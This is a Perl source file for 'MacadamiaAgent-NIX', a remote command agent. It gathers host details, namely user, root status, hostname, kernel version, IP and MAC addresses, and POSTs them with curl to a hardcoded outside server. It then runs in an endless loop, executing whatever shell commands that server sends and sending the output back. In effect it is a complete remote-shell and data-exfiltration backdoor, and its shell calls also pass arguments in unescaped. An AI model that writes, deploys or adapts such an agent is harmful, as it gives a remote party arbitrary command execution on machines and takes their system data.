#!/usr/bin/perl

# MacadamiaAgent-NIX
# catswords@protonmail.com

use strict;
use warnings;
use Cwd qw(cwd);

my $cwd = cwd;
my $uuid_fp = "$cwd/uuid.txt";
my $sysinfo_fp = "/tmp/sysinfo.txt";
my $report_fp = "/tmp/report.txt";
#my $stdout = "/tmp/stdout.txt";
#my $stderr = "/tmp/stderr.txt";

my $jobkey = "init";
my $jobstage = "unknown";
my $joburl = "http://databean.co.kr:8091/~gw/?route=api.agent.noarch";
my %jobargs = ();
my $jobperiod = 1;

my $ua = "MacadamiaAgent-NIX/0.38.3-20200220";
my $uos = "Unknown";
my $mimetype = "text/plain";
my $timeout = 60;

my $UUID = "e30635b6-b7be-4cfa-9bf9-4fe2511c04c1"; # default UUID

sub ltrim { my $s = shift; $s =~ s/^\s+//;       return $s };
sub rtrim { my $s = shift; $s =~ s/\s+$//;       return $s };
sub  trim { my $s = shift; $s =~ s/^\s+|\s+$//g; return $s };

sub println { print shift . "\r\n"; }
sub EOF { return "<<<EOF\r\n" . shift . "\r\nEOF;"; }

sub random_string {
    return sprintf("%08x", rand(0xffffffff));
}

sub exec_shell {
    my $cmd = shift;
    my $str = "";
    my $err = "";
    my $stdout = "/tmp/stdout_" . random_string();
    my $stderr = "/tmp/stderr_" . random_string();

    system("($cmd) 1>$stdout 2>$stderr");
    print("    > $cmd\r\n");
    #print("        <[INFO]Wait a 1 second while writing stdout\r\n");
    #sleep(1);

    open FILE, $stdout; while (<FILE>) { $str .= $_; }
    print "        <[STDOUT] $str\r\n";
    
    open FILE, $stderr; while (<FILE>) { $err .= $_; }
    print "        <[STDERR] $err\r\n";
	
    unlink $stdout;
    unlink $stderr;

    return rtrim($str);
}

sub exec_shell_fp {
    my $cmd = shift;
    my $stdout = "/tmp/stdout_" . random_string();

    system("($cmd) 1>$stdout 2>/dev/null");
    print("    > $cmd\r\n");
    #print("        <[INFO]Wait a 1 second while writing stdout\r\n");
    #sleep(1);

    return $stdout;
}

sub whoami {
    return exec_shell("whoami");
}

sub fw {
    my $line = shift;
    my $of = shift;
    return exec_shell("(echo '$line' > '$of') && echo 1");
}

sub fwl {
    my $line = shift;
    my $of = shift;
    return exec_shell("(echo '$line' >> '$of') && echo 1");
}

sub cat {
    my $if = shift;
    return exec_shell("cat '$if'");
}

sub copycat {
    my $if = shift;
    my $of = shift;
    return exec_shell("cat '$if' >> '$of'");
}

sub base64_encode {
    my $data = shift;
    return exec_shell("echo '$data' | openssl enc -base64");
}

sub base64_encode_fp {
    my $if = shift;
    my $of = "/tmp/output_" . random_string();

    exec_shell("openssl base64 -in '$if' -out '$of'");

    return $of;
}

sub work_get {
    return report("UUID: $UUID");
}

sub user_IsElevated {
    return (whoami eq "root") ? "true" : "false";
}

sub user_URI {
    return whoami . "@" . exec_shell("hostname");
}

sub user_ComputerName {
    return exec_shell("hostname");
}

sub user_OS {
    return cat("/proc/version");
}

sub user_Arch {
    return exec_shell("uname -m");
}

sub user_CWD {
    return $cwd;
}

sub user_Net_IP {
    return exec_shell("ip addr | grep inet | awk '{print \$2}' | awk -F'/' '{print \$1}'");
}

sub user_Net_MAC {
    return exec_shell("ip addr | grep ether | awk '{print \$2}'");
}

sub user_UUID {
    unless (-e $uuid_fp) {
        fw(cat("/proc/sys/kernel/random/uuid"), $uuid_fp);
    }
    return cat($uuid_fp);
}

sub make_sysinfo {
    my $IsElevated = user_IsElevated;
    my $URI = user_URI;
    my $ComputerName = user_ComputerName;
    my $OS = user_OS;
    my $Arch = user_Arch;
    my $CWD = user_CWD;
    my $Net_IP = EOF(user_Net_IP);
    my $Net_MAC = EOF(user_Net_MAC);

    fw('', $sysinfo_fp);
    fwl("UUID: " . $UUID, $sysinfo_fp);
    fwl("IsElevated: " . $IsElevated, $sysinfo_fp);
    fwl("URI: " . $URI, $sysinfo_fp);
    fwl("ComputerName: " . $ComputerName, $sysinfo_fp);
    fwl("OS: " . $OS, $sysinfo_fp);
    fwl("Arch: " . $Arch, $sysinfo_fp);
    fwl("CWD: " . $CWD, $sysinfo_fp);
    fwl("Net_IP: " . $Net_IP, $sysinfo_fp);
    fwl("Net_MAC: " . $Net_MAC, $sysinfo_fp);

    return cat($sysinfo_fp);
}

sub report {
    my $DATA = EOF(base64_encode(shift));
    my $os = user_OS;

    fw('', $report_fp);
    fwl("UUID: " . $UUID, $report_fp);
    fwl("DATA: " . $DATA, $report_fp);
    fwl("JOBKEY: " . $jobkey, $report_fp);
    fwl("JOBSTAGE: " . $jobstage, $report_fp);

    return exec_shell("curl -X POST -A \"$ua ($uos)\" -H \"Content-Type: $mimetype\" --data-binary \"\@$report_fp\" --connect-timeout $timeout $joburl");
}

sub report_fp {
    my $fp = base64_encode_fp(shift);
    #my $DATA = EOF(base64_encode_fp(shift));
    my $os = user_OS;

    fw('', $report_fp);
    fwl("UUID: " . $UUID, $report_fp);
    #fwl("DATA: " . $DATA, $report_fp);
    fwl("DATA: <<<EOF", $report_fp);
    copycat($fp, $report_fp);
    fwl("EOF;", $report_fp);
    fwl("JOBKEY: " . $jobkey, $report_fp);
    fwl("JOBSTAGE: " . $jobstage, $report_fp);

    print(cat($report_fp));

    return exec_shell("curl -X POST -A \"$ua ($uos)\" -H \"Content-Type: $mimetype\" --data-binary \"\@$report_fp\" --connect-timeout $timeout $joburl");
}

sub do_work {
    my $work = "";

    if($jobkey eq "init") {
        $work = report(make_sysinfo);
    } elsif($jobkey eq "cmd") {
        $work = report_fp(exec_shell_fp($jobargs{'data.cmd'}));
    } else {
        $work = work_get;
    }

    my $_jobkey = "";
    my $_jobstage = "";

    my @lines = split("\r\n", $work);
    for my $line (@lines) {
        my $index = index($line, ":");

        if(!($index < 0)) {
            my $work_key = rtrim(substr($line, 0, $index));
            my $work_value = ltrim(substr($line, ($index + 1)));

            $jobargs{$work_key} = $work_value;

            if($work_key eq "jobkey") {
                $_jobkey = $work_value;
            }

            if($work_key eq "jobstage") {
                $_jobstage = $work_value;
            }
        }
    }

    if($_jobkey eq "") {
        $_jobkey = "init";
        $_jobstage = "unknown";
        println("JOBKEY will return to init.");
    }

    $jobkey = $_jobkey;
    $jobstage = $_jobstage;
}

sub main {
    $UUID = user_UUID;
    $uos = user_OS;
    
    while (1) {
        do_work;
        sleep($jobperiod);
    }
}

main;
